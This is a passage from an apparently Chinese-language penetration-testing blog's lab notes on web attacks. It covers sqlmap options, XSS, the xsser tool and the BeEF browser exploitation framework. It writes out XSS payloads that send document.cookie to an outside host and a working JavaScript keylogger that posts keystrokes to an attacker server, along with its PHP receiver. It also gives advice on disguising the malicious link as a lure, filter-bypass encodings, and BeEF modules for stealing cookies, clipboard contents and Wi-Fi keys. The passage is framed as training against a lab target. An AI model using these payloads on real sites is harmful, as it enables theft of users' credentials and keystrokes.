src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203183301060.png" alt="image-20230203183301060"></p><h4 id="General"><a href="#General" class="headerlink" title="General"></a>General</h4><blockquote><ul><li>-s：sqlite会话文件保存位置</li><li>-t：记录流量文件保存位置</li><li>–charset：强制字符编码<ul><li>–charset&#x3D;GBK</li></ul></li><li>–crawl：从起始位置爬站深度<ul><li>–batch –crawl&#x3D;3</li></ul></li><li>–csv-del：dump数据默认存于<code>&quot;,&quot;</code>分割的CSV文件中，指定其他分隔符<ul><li>–csv-del&#x3D;”;”</li></ul></li><li>–dbms-cred：指定数据库账号</li><li>–flush-session：清空session</li><li>–forms：自动从-u中的url获取页面中的表单进行测试</li><li>–force-ssl       # https网站注入</li><li>–fresh-queries：忽略session查询结果</li><li>–hex：dump非ASCII字符内容时，将其编码为16进制形式，收到后解码还原<ul><li><code>sqlmap -u &quot;http://1.1.1.1/s.php?id=1&quot; --hex -v 3</code></li></ul></li><li>–output-dir&#x3D;&#x2F;tmp  # 指定输出目录</li><li>–parse-errors：分析和显示数据库内建报错信息<ul><li><code>sqlmap.py -u &quot;http://1.1.1.1/sqlmap/a.asp?id=1&quot; --parse-errors</code></li></ul></li><li>–save：将命令保存成配置文件</li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203183343751.png" alt="image-20230203183343751"></p><h4 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h4><blockquote><ul><li>-z：参数助记符<ul><li>原始命令：<code>sqlmap --batch --random-agent --ignore-proxy --technique=BEU -u &quot;1.1.1.1/a.php?id=1&quot;</code> </li><li>简写命令：<code>sqlmap -z &quot;bat,randoma,ign,tec=BEU&quot; -u “1.1.1.1/a.php?id=1&quot;</code></li></ul></li><li>–answer      <ul><li><code>sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot;--technique=E --answers=&quot;extending=N&quot; --batch</code>            # 当遇到<code>extending</code>时answer参数回答<code>No</code></li></ul></li><li>–check-waf：检测WAF &#x2F; IPS &#x2F;IDS</li><li>–hpp：HTTP parameter pollution<ul><li>绕过WAF &#x2F; IPS &#x2F; IDS的有效方法</li><li>尤其对ASP &#x2F; IIS 和 ASP.NET &#x2F; IIS</li></ul></li><li>–identify-waf：彻底的WAF&#x2F;IPS&#x2F;IDS检查<ul><li>支持30多种产品</li></ul></li><li>–purge：清除output文件夹</li><li>–smart：当有大量检测目标时，只选择基于错误的检测结果</li><li>–wizard</li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203190825613.png" alt="image-20230203190825613"></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><blockquote><ul><li><p>攻击WEB客户端</p></li><li><p>客户端脚本语言</p><ul><li>弹窗告警、广告</li><li>Javascript</li><li>在浏览器中执行</li></ul></li><li><p>XSS（cross-site scripting）</p><ul><li>通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的</li><li>注入客户端脚本代码</li><li>盗取cookie<ul><li>注入代码：<code>&lt;script src=http://1.1.1.1/a.js&gt;&lt;/script&gt; </code><ul><li>a.js源码：<code>var img = new Image(); img.src = &quot;http://1.1.1.1/cookies.php?cookie=&quot;+document.cookie;</code></li></ul></li></ul></li><li>重定向</li></ul></li><li><p>VBScript, ActiveX, or Flash</p></li><li><p>JavaScript</p><ul><li>与Java语言无关</li><li>命名完全出于市场原因</li><li>使用最广的客户端脚本语言</li></ul></li><li><p>使用场景</p><ul><li>直接嵌入html：<code>&lt;script&gt; alert(&#39;XSS&#39;); &lt;/script&gt;</code></li><li>元素标签事件：<code>&lt;body onload=alert(&#39;XSS&#39;)&gt;</code></li><li>图片标签：<code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></li><li>其他标签：<code>&lt;iframe&gt;, &lt;div&gt;, and &lt;link&gt;</code></li><li>DOM对象：篡改页面内容</li></ul></li><li><p>攻击参与方</p><ul><li>攻击者</li><li>被攻击者</li><li>漏洞站点</li><li>第三方站点（攻击目标、攻击参与站）</li></ul></li><li><p>漏洞形成的根源（原理）</p><ul><li>服务器对用户提交数据过滤不严</li><li>提交给服务器的脚本被直接返回给其他客户端执行</li><li>脚本在客户端执行恶意操作</li></ul></li><li><p>XSS漏洞类型</p><ul><li>存储型（持久型）</li><li>反射型（非持久）<ul><li>攻击者发送给客户端XSS链接，诱使客户端点击</li></ul></li><li>DOM型</li></ul></li><li><p>漏洞PoC</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;alert(‘xss’)&lt;&#x2F;script&gt;&lt;a href&#x3D;&#39;&#39; onclick&#x3D;alert(&#39;xss&#39;)&gt;type&lt;&#x2F;a&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;1.1.1.1&#x2F;a.ipg onerror&#x3D;alert(&#39;xss&#39;)&gt;&lt;script&gt;window.location&#x3D;‘http:&#x2F;&#x2F;1.1.1.1&#39;&lt;&#x2F;script&gt;&lt;iframe SRC&#x3D;&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;victim&quot; height &#x3D; &quot;0&quot; width &#x3D;&quot;0&quot;&gt;&lt;&#x2F;iframe&gt;&lt;script&gt;new Image().src&#x3D;&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;c.php?output&#x3D;&quot;+document.cookie;&lt;&#x2F;script&gt;&lt;script&gt;document.body.innerHTML&#x3D;&quot;&lt;div style&#x3D;visibility:visible;&gt;&lt;h1&gt;THIS WEBSITE IS UNDER ATTACK&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&quot;;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></blockquote><h3 id="反射型（非持久）"><a href="#反射型（非持久）" class="headerlink" title="反射型（非持久）"></a>反射型（非持久）</h3><ul><li>当客户端输入123123后服务端返回原样数据，判断可能存在xss注入</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203220201965.png" alt="image-20230203220201965"></p><ul><li><p>验证</p><ul><li>注入代码：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203220504591.png" alt="image-20230203220504591"></p></li></ul><blockquote><p>出现弹窗告警，存在xss注入</p></blockquote><ul><li><p>html注入</p><ul><li><code>&lt;a href=&quot;192.168.216.167&quot;&gt;click&lt;/a&gt;</code></li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203220642473.png" alt="image-20230203220642473"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203220722646.png" alt="image-20230203220722646"></p></li></ul><blockquote><p>出现click链接，点击链接会跳转到目标地址</p></blockquote><ul><li><p>篡改页面</p><ul><li><p>注入代码</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;document.body.innerHTML&#x3D;&quot;&lt;div style&#x3D;visibility:visible;&gt;&lt;h1&gt;THIS   WEBSITE IS UNDER ATTACK&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&quot;;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203223011156.png" alt="image-20230203223011156"></p><h3 id="反射型—键盘记录器"><a href="#反射型—键盘记录器" class="headerlink" title="反射型—键盘记录器"></a>反射型—键盘记录器</h3><blockquote><p>攻击流程：</p><p>利用服务器漏洞，攻击者需要社工等欺骗手段将含有xss漏洞的漏洞利用JS程序代码发送给受害者，受害者拿到JS代码后就会在本地提交请求，将JS内容提交给服务器，由于服务器对输入没有进行严格的过滤，对输出也没有进行严格的编码，客户端提交给服务器的代码内容都会原封不动的返回给客户端，返回给客户端后就会进入客户端的浏览器在浏览器中执行，就可以实现攻击客户端计算机。</p></blockquote><p>Keylogger.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function-variable function">onkeypress</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">evt</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>evt <span class="token operator">=</span> evt <span class="token operator">||</span> window<span class="token punctuation">.</span>eventkey <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>evt<span class="token punctuation">.</span>charCode<span class="token punctuation">)</span>  # 记录键盘内容<span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> param <span class="token operator">=</span> <span class="token function">encodeURI</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"http://192.168.216.171/keylogger.php"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span># 发送给指定<span class="token constant">URL</span>http<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>http<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"key="</span><span class="token operator">+</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="搭建实验环境"><a href="#搭建实验环境" class="headerlink" title="搭建实验环境"></a>搭建实验环境</h4><h5 id="在kali中启动Apache"><a href="#在kali中启动Apache" class="headerlink" title="在kali中启动Apache"></a>在kali中启动Apache</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204120032284.png" alt="image-20230204120032284"></p><h5 id="在根目录下写入JS文件"><a href="#在根目录下写入JS文件" class="headerlink" title="在根目录下写入JS文件"></a>在根目录下写入JS文件</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204120311612.png" alt="image-20230204120311612"></p><blockquote><p>JS文件中是让客户端访问kali下的keylogger.php文件</p></blockquote><h5 id="创建keylogger-php"><a href="#创建keylogger-php" class="headerlink" title="创建keylogger.php"></a>创建keylogger.php</h5><blockquote><p>用来接收客户端提交的数据</p></blockquote><p>Keylogger.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment"># 接收psot请求数据</span><span class="token variable">$logfile</span><span class="token operator">=</span><span class="token string double-quoted-string">"keylog.txt"</span><span class="token punctuation">;</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$logfile</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment"># 将数据写入文件中</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204121019626.png" alt="image-20230204121019626"></p><h5 id="创建空白文件"><a href="#创建空白文件" class="headerlink" title="创建空白文件"></a>创建空白文件</h5><blockquote><p>写入客户端提交的数据</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204122317557.png" alt="image-20230204122317557"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204122343430.png" alt="image-20230204122343430"></p><h4 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h4><h5 id="提交JS注入代码"><a href="#提交JS注入代码" class="headerlink" title="提交JS注入代码"></a>提交JS注入代码</h5><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.216</span><span class="token number">.171</span><span class="token operator">/</span>keylogger<span class="token punctuation">.</span>js<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204121859133.png" alt="image-20230204121859133"></p><blockquote><p>此时已经将JS恶意代码发送到服务器，只要客户端敲击键盘，kali接收端就会将键盘敲击记录写入keylogger.txt</p></blockquote><h5 id="随意敲击键盘"><a href="#随意敲击键盘" class="headerlink" title="随意敲击键盘"></a>随意敲击键盘</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204130615563.png" alt="image-20230204130615563"></p><blockquote><p>可以看到已经记录了客户端敲击的内容；如果客户端输入账户和密码就可以被窃取</p></blockquote><h4 id="伪装注入代码"><a href="#伪装注入代码" class="headerlink" title="伪装注入代码"></a>伪装注入代码</h4><blockquote><p>防止在客户端URL被发现异常，进行伪装注入代码</p></blockquote><h5 id="创建html文件"><a href="#创建html文件" class="headerlink" title="创建html文件"></a>创建html文件</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204131025543.png" alt="image-20230204131025543"></p><blockquote><p>其中xss可以修改为诱惑性的词语，比如：抢苹果手机等等</p><p><strong>前提是需要客户端已经登录进页面</strong></p></blockquote><h5 id="点击超链接"><a href="#点击超链接" class="headerlink" title="点击超链接"></a>点击超链接</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204131515394.png" alt="image-20230204131515394"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204131526527.png" alt="image-20230204131526527"></p><blockquote><p>点击之后会跳转到此页面</p></blockquote><h5 id="随意敲击键盘-1"><a href="#随意敲击键盘-1" class="headerlink" title="随意敲击键盘"></a>随意敲击键盘</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204131703060.png" alt="image-20230204131703060"></p><blockquote><p>xss键盘记录器就是以上思路及流程</p></blockquote><h3 id="xsser"><a href="#xsser" class="headerlink" title="xsser"></a>xsser</h3><blockquote><ul><li>命令行 &#x2F; 图形化 工具</li><li>绕过服务器端输入筛选<ul><li>10进制 &#x2F; 16进制 编码</li><li>unescape()</li></ul></li><li>–heuristic 检查被过滤的字符</li></ul></blockquote><h4 id="图形化"><a href="#图形化" class="headerlink" title="图形化"></a>图形化</h4><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204132529916.png" alt="image-20230204132529916"></p><h4 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h4><ul><li><p><code>xsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -g &quot;xss_r/?name=&quot; --cookie=&quot;security=low; PHPSESSID=bde2205b1b71464b420f6a92b2001def&quot; -s -v --reverse-check</code></p><blockquote><p>-u：不是完整的url，<code>http://1.1.1.1/dvwa/vulnerabilities/</code></p><p>-g：表示使用Get方法，<code>xss_r/?name=</code></p><p>-s：xss测试结束后进行统计</p><p>-v：显示详细信息</p><p>–reverse-check：如果不加这个参数xsser会只发送一个hash值给服务器，查看是否能将该hash原封不动的返回回来。此时可能会有一个问题：服务器没有过滤hash值，但过滤了html(js)代码，造成了xsser显示有xss漏洞，但是不能真正利用。加这个参数后xsser会再发送一个真正的js脚本来检测(发送的js脚本功能为主动连接自己某个端口，如果xsser发现将js发送过去后它又来连接自己制定端口了就说明对方存在xss漏洞)。</p><p>格式如上，与其他工具的url命令有所不同</p></blockquote></li></ul><h5 id="对payload编码，绕过过滤"><a href="#对payload编码，绕过过滤" class="headerlink" title="对payload编码，绕过过滤"></a>对payload编码，绕过过滤</h5><blockquote><ul><li>–Str Use method String.FromCharCode()</li><li>–Une Use Unescape() function</li><li>–Mix Mix String.FromCharCode() and Unescape()</li><li>–Dec Use Decimal encoding</li><li>–Hex Use Hexadecimal encoding</li><li>–Hes Use Hexadecimal encoding, with semicolons</li><li>–Dwo Encode vectors IP addresses in DWORD</li><li>–Doo Encode vectors IP addresses in Octal</li><li>–Cem&#x3D;CEM Try -manually- different Character Encoding Mutations(reverse obfuscation: good) -&gt; (ex: ‘Mix,Une,Str,Hex’)</li><li>注入技术（多选）<ul><li>–Coo Cross Site Scripting Cookie injection </li><li>–Xsa Cross Site Agent Scripting </li><li>–Xsr Cross Site Referer Scripting </li><li>–Dcp Data Control Protocol injections </li><li>–Dom Document Object Model injections </li><li>–Ind HTTP Response Splitting Induced code </li><li>–Anchor Use Anchor Stealth payloader (DOM shadows!) </li><li>–Phpids PHP - Exploit PHPIDS bug (0.6.5) to bypass filters</li><li>–Doss XSS Denial of service (server) injection </li><li>–Dos XSS Denial of service (client) injection </li><li>–B64 Base64 code encoding in META tag (rfc2397) </li><li>–Onm ONM - Use onMouseMove() event to inject code </li><li>–Ifr Use <iframe> source tag to inject code</iframe></li></ul></li></ul></blockquote><blockquote><p>kali安装的xsser出现了问题，老是报找不到攻击点的错误，导致测试实例不成功，就不放截图了</p></blockquote><h3 id="其他类型XSS文章及实操"><a href="#其他类型XSS文章及实操" class="headerlink" title="其他类型XSS文章及实操"></a>其他类型XSS文章及实操</h3><p>一文看懂xss：</p><p><a href="https://noobxw.github.io/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/">https://noobxw.github.io/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/</a></p><p>xss实操：</p><p><a href="https://noobxw.github.io/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/">https://noobxw.github.io/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/</a></p><h2 id="BEEF"><a href="#BEEF" class="headerlink" title="BEEF"></a>BEEF</h2><blockquote><ul><li>浏览器攻击面<ul><li>应用普遍转移到B &#x2F; S架构，浏览器成为统一客户端程序</li><li>结合社会工程学方法对浏览器进行攻击</li><li>攻击浏览器用户</li><li>通过注入的JS脚本，利用浏览器攻击其他网站</li></ul></li><li>BeEF（Browser exploitation framework）<ul><li>生成、交付payload</li><li>Ruby语言编写</li><li>服务器端：管理hooked客户端</li><li>客户端：运行于客户端浏览器的 Javascript 脚本（hook）</li></ul></li><li>攻击手段<ul><li>利用网站xss漏洞实现</li><li>诱使客户端访问含有hook的伪造站点</li><li>结合中间人攻击注入hook脚本</li></ul></li><li>常见用途<ul><li>键盘记录器</li><li>网络扫描</li><li>浏览器信息搜集</li><li>绑定shell</li><li>与 metasploit 集成</li></ul></li><li>BeEF上线页面<ul><li>Details：<ul><li>浏览器、插件版本信息；操作系统信息</li></ul></li><li>Logs：<ul><li>浏览器动作：焦点变化、鼠标点击、信息输入</li></ul></li><li>Commands：命令模块<ul><li>绿色模块：表示模块适合目标浏览器，并且执行结果被客户端不可见</li><li>红色模块：表示模块不适用于当前用户，有些红色模块也可正常执行</li><li>橙色模块：模块可用，但结果对用户可见（CAM弹窗申请权限等）</li><li>灰色模块：模块未在目标浏览器上测试过</li></ul></li><li>主要模块<ul><li>Browsers</li><li>Exploits </li><li>Host</li><li>Persistence</li><li>Network</li></ul></li></ul></li></ul></blockquote><h3 id="利用BeEF进行攻击"><a href="#利用BeEF进行攻击" class="headerlink" title="利用BeEF进行攻击"></a>利用BeEF进行攻击</h3><h4 id="使用存储型xss注入-hook-js"><a href="#使用存储型xss注入-hook-js" class="headerlink" title="使用存储型xss注入 hook.js"></a>使用存储型xss注入 hook.js</h4><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204213346896.png" alt="image-20230204213346896"></p><ul><li>在BeEF处查看</li></ul><blockquote><p>目标主机已经上线</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204213614116.png" alt="image-20230204213614116"></p><h4 id="Broswer模块"><a href="#Broswer模块" class="headerlink" title="Broswer模块"></a>Broswer模块</h4><h5 id="开启客户端摄像头"><a href="#开启客户端摄像头" class="headerlink" title="开启客户端摄像头"></a>开启客户端摄像头</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204220102520.png" alt="image-20230204220102520"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204220221182.png" alt="image-20230204220221182"></p><h5 id="Get-Cookie"><a href="#Get-Cookie" class="headerlink" title="Get Cookie"></a>Get Cookie</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204220328344.png" alt="image-20230204220328344"></p><h4 id="Exploits模块"><a href="#Exploits模块" class="headerlink" title="Exploits模块"></a>Exploits模块</h4><h5 id="Apache-Cookie-泄露漏洞"><a href="#Apache-Cookie-泄露漏洞" class="headerlink" title="Apache Cookie 泄露漏洞"></a>Apache Cookie 泄露漏洞</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204220706126.png" alt="image-20230204220706126"></p><h5 id="路由器的CSRF漏洞"><a href="#路由器的CSRF漏洞" class="headerlink" title="路由器的CSRF漏洞"></a>路由器的CSRF漏洞</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204220956419.png" alt="image-20230204220956419"></p><h4 id="Host模块"><a href="#Host模块" class="headerlink" title="Host模块"></a>Host模块</h4><h5 id="Get-Wireless-Keys获取无线密钥"><a href="#Get-Wireless-Keys获取无线密钥" class="headerlink" title="Get Wireless Keys获取无线密钥"></a>Get Wireless Keys获取无线密钥</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204221427875.png" alt="image-20230204221427875"></p><h5 id="Get-Clipboard获取粘贴板"><a href="#Get-Clipboard获取粘贴板" class="headerlink" title="Get Clipboard获取粘贴板"></a>Get Clipboard获取粘贴板</h5><blockquote><p>将客户端复制内容的粘贴板获取到，拿到粘贴板内容</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204221537609.png" alt="image-20230204221537609"></p><h4 id="Network模块"><a href="#Network模块" class="headerlink" title="Network模块"></a>Network模块</h4><h5 id="DOSer拒绝服务"><a href="#DOSer拒绝服务" class="headerlink" title="DOSer拒绝服务"></a>DOSer拒绝服务</h5><blockquote><p>填写目标URL等信息；</p><p>将hook的浏览器当作僵尸机使用；</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204221741710.png" alt="image-20230204221741710"></p><h5 id="Port-Scanner端口扫描"><a href="#Port-Scanner端口扫描" class="headerlink" title="Port Scanner端口扫描"></a>Port Scanner端口扫描</h5><p><img 